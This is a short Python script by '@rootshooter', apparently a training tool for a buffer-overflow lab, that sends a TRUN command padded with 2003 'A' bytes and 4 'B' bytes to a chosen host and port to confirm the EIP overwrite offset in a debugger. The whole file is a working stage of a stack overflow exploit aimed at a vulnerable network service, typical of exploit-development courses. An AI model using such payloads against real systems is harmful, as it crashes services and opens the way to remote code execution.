#!/usr/bin/python
import optparse, sys, socket

parser = optparse.OptionParser('Example: python eip_finder.py -t <target host> -p <target port>')
parser.add_option('-t', dest='target', type='string', help='Enter a target host')
parser.add_option('-p', dest='port', type='int', help='Enter a target port')
(options, args) = parser.parse_args()
target = options.target
port = options.port

if (target == None) | (port == None):
	print(parser.usage)
	exit(0)

print('\n----------------------------------EIP VERIFY------------------------------------')
print('                            EIP Offset Verification')
print('                             Author: @rootshooter')
print('                                 Version: 1.0')
print('--------------------------------------------------------------------------------')


command = 'TRUN /.:/ '
payload = 'A' * 2003 + 'B' * 4 #CHANGE OFFSET AS NEEDED

try:
	print('[+] Sending Payload')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target , port))
	s.send((command + payload))
	s.close()
	print('[+] Payload Sent')
	print('[+] Check debugger')
except:
	print('[-] ERROR: Check the debugger')
	sys.exit()
